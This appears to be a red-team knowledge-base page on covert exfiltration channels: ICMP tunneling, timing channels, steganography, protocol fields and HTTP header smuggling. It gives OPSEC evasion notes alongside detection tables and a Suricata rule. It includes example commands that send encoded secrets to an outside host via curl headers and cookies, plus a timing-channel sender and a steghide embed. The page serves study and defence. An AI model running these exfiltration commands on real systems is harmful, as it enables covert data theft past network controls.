# Covert Channels

*Low-bandwidth, hard-to-spot channels for moving small secrets when normal egress is blocked - high effort, low throughput, niche use.*

Related: [Exfil principles](01-exfil-principles-and-staging.md) |
[DNS tunneling](03-dns-tunneling.md) |
[Out-of-band & throttling](06-out-of-band-and-throttling.md)

## What & why

A covert channel hides data in a carrier that appears legitimate or passes through controls that
block explicit data channels. They are used when the normal egress paths (HTTPS, DNS, ICMP) are
all blocked or heavily inspected, or when you need to move a small, high-value secret (a key,
a credential, a short token) through a channel a defender is unlikely to specifically monitor.
The tradeoffs are severe: throughput is measured in bytes to kilobytes per minute, setup is
complex, and each channel still leaves its own distinctive signature. Covert channels are a tool
of last resort, not a general-purpose exfil strategy.

## Technique

### ICMP tunneling

ICMP Echo Request (type 8) and Echo Reply (type 0) carry a data payload. Standard ping payloads
are 32-56 bytes. Tunneling tools encode arbitrary data into these payloads and use a host on the
operator side to decode it.

**Conceptual mechanics:**

```
Target host                           Operator host
  +---------+                          +---------+
  | icmp-tx | --ICMP Echo (data)--->   | icmp-rx |
  |         | <--ICMP Reply (resp)---  |         |
  +---------+                          +---------+
```

Tools like `ptunnel-ng` and `icmptunnel` implement this. The throughput is limited by ICMP
round-trip time and packet size (typically 64-1400 bytes per packet).

```bash
# check if ICMP is allowed outbound
ping -c 1 -W 2 203.0.113.10 && echo "ICMP reachable"

# probe payload size limit (some firewalls restrict to standard sizes)
ping -c 1 -s 1000 203.0.113.10
```

**Throughput estimate:** 1400 bytes/packet x 10 packets/second = ~14 KB/s theoretical maximum.
In practice, rate limiting and inspection bring this lower.

### Timing / covert-timing channels

Data is encoded in the inter-arrival times between packets rather than in packet content.
A sender emits packets at intervals that encode bits (e.g. short interval = 0, long interval = 1).
A receiver decodes by measuring arrival times.

```
Bit stream:    0   1   0   0   1
Interval (ms): 50  200 50  50  200
```

This is robust to content inspection because the payload of each packet is benign or empty.
Detection requires timing analysis, which is rare in standard SIEM deployments. However:
- Throughput is extremely low (1 bit per packet pair at ~10 packets/second = ~1.25 bytes/sec)
- Clock jitter and network latency corrupt the signal
- Not practical for anything larger than a short string (< 100 bytes)

```bash
# crude timing channel sender concept (bash only, for illustration)
send_bit() {
  local bit=$1
  if [ "$bit" = "1" ]; then
    sleep 0.200  # 200ms = 1
  else
    sleep 0.050  # 50ms  = 0
  fi
  ping -c 1 203.0.113.10 > /dev/null
}
```

### Steganography

Steganography hides data inside a carrier file (image, audio, document) that appears innocent
when transferred over a sanctioned channel (email, file share, web upload).

**LSB (Least Significant Bit) in images:**

Embed data by replacing the least significant bit of pixel color values. For a 1 MP image
(1000x1000 px x 3 channels = 3 million bits = 375 KB capacity). The visual difference is
imperceptible to humans.

```bash
# steghide - embed in JPEG
steghide embed -cf cover_image.jpg -sf secret.txt -p LAB_PASS -f

# extract
steghide extract -sf stego_image.jpg -p LAB_PASS
```

```bash
# zsteg - analyze PNG for LSB steganography (detection tool)
zsteg suspicious.png -a
```

**Document metadata / whitespace:**

Data can be hidden in document metadata fields, whitespace, or unicode zero-width characters
in text. These survive casual inspection but are visible to tools that parse the full document
structure.

**Throughput vs capacity:**

| Method | Capacity | Throughput | Detection resistance |
|---|---|---|---|
| JPEG LSB | ~10% of image size | Carrier-file-transfer speed | Moderate (steganalysis exists) |
| PNG LSB | ~12.5% of image size | Same | Lower (lossless = no noise masking) |
| Audio LSB | ~6% of audio size | Same | Moderate |
| Document metadata | Bytes | Same | Low (trivially inspected) |

### Protocol field abuse

Unused or partially-used fields in standard protocol headers can carry small amounts of data.

| Field | Capacity | Notes |
|---|---|---|
| IP ID field | 2 bytes/packet | Normally sequential; randomized in modern kernels |
| TCP sequence number (initial) | 4 bytes/connection | Usually randomized for security |
| TCP timestamp option | 8 bytes/connection | Many implementations use real time |
| DNS TTL in responses | 4 bytes/response | Server-controlled; very slow channel |
| ICMP sequence number | 2 bytes/packet | Standard, low suspicion |

```bash
# read IP ID of outbound packets (observe only)
tcpdump -nn -c 5 icmp and src host 192.0.2.1 2>/dev/null | grep "id "
```

Modern OS kernels randomize the IP ID field by default for security, making it unsuitable for
covert use without kernel patching (which is out of scope for most engagements).

### HTTP header / cookie smuggling

Small secrets (tokens, keys) can be embedded in HTTP header values or cookie names that appear
benign.

```bash
# embed 16 bytes base64-encoded in a custom header
curl -H "X-Request-ID: $(echo -n 'secret16byteskey' | base64 -w0)" https://203.0.113.10/api/

# or in a cookie value
curl -b "session=valid_token; __cfduid=$(echo -n 'secret' | base64 -w0)" https://203.0.113.10/
```

Note: base64 in headers is still visible to proxy DLP and header-inspection rules. This is a
way to blend small data into legitimate-looking requests, not a way to avoid all inspection.

## OPSEC notes

- ICMP: standard ICMP payload sizes are 32-64 bytes. Oversized payloads (>128 bytes) are
  anomalous and Suricata/Zeek flag them by default. High ICMP volume to a single host is
  also anomalous. Most corporate firewalls rate-limit or block ICMP to external hosts.
- Timing channels: robust to content inspection but require the operator-side listener to
  have a stable, low-latency connection. Network jitter destroys the signal.
- Steganography: the carrier file transfer is still a NetFlow event and a DLP content scan.
  The steganographic content survives a blind content scan but steganalysis tools exist and
  are used by some advanced threat-intel teams. PNG/BMP LSB is well-studied and easy to
  detect; JPEG LSB is harder but not undetectable.
- Protocol field covert channels require the field to be server/sender-controlled. Most useful
  fields are now randomized by default in modern kernels.
- All of these channels are high-effort, low-throughput, and niche. For anything larger than
  a few hundred bytes, DNS tunneling or HTTPS is more practical.

## Detection & telemetry

### ICMP

| Signal | Source | Detail |
|---|---|---|
| ICMP payload size > 64 bytes | Suricata, Zeek icmp.log, firewall | Default ICMP data payload is 32-56 bytes |
| High ICMP volume to single host | NetFlow, Zeek | >100 ICMP requests/minute to one destination |
| ICMP to external IPs | Firewall deny log | Most orgs block outbound ICMP at the perimeter |

**Suricata rule - oversized ICMP payload:**

```
alert icmp any any -> $EXTERNAL_NET any (
  msg:"Oversized ICMP payload - possible tunnel";
  dsize:>128;
  itype:8;
  sid:9000010; rev:1;
)
```

### Steganography

| Signal | Source | Detail |
|---|---|---|
| Image upload DLP trigger | Proxy/CASB DLP | File upload of unexpected image type from server workload |
| Steganalysis match | Endpoint DLP tool | Tools: `stegdetect`, `zsteg`, `StegExpose` |
| Anomalous file size | EDR, proxy | Image file size significantly larger than typical for resolution |

```bash
# blue team: quick stego check on suspicious images
# stegdetect (JPEG)
stegdetect -t p suspicious.jpg

# zsteg (PNG)
zsteg -a suspicious.png 2>/dev/null | head -20
```

### Protocol covert channels

| Signal | Source | Detail |
|---|---|---|
| Non-random IP ID field | Zeek conn.log, pcap | Sequential or patterned IP IDs in modern kernel suggests manipulation |
| Anomalous TCP timestamp values | Zeek, Wireshark | Timestamp values not tracking real time |
| Unusual DNS TTL values | Zeek dns.log | TTL values not matching normal resolver behavior |

## MITRE ATT&CK

- **T1048** - Exfiltration Over Alternative Protocol
- **T1095** - Non-Application Layer Protocol (ICMP tunneling)
- **T1001** - Data Obfuscation
- **T1001.002** - Data Obfuscation: Steganography
- **T1071** - Application Layer Protocol (HTTP header smuggling)

## References

- MITRE ATT&CK T1095 Non-Application Layer Protocol: https://attack.mitre.org/techniques/T1095/
- MITRE ATT&CK T1001.002 Steganography: https://attack.mitre.org/techniques/T1001/002/
- ptunnel-ng ICMP tunnel tool: https://github.com/lnslbrty/ptunnel-ng
- Zeek icmp.log reference: https://docs.zeek.org/en/master/logs/
- stegdetect tool: https://github.com/abeluck/stegdetect
- zsteg tool (PNG/BMP analysis): https://github.com/zed-0xff/zsteg
- Covert channel fundamentals (Lampson 1973): classic academic reference on the concept
